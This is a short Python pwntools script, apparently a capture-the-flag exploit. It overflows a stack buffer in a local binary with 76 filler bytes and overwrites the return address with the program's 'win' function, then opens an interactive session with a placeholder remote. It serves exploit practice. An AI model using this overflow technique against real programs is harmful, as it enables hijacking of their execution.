#!/usr/bin/env python3

from pwn import *

exe = ELF("./test_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
            b * vuln +110
            c
                    """)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    payload = flat(
        "A" * 76,
        p32(exe.sym.win)
    )
    r.sendlineafter("input:",payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
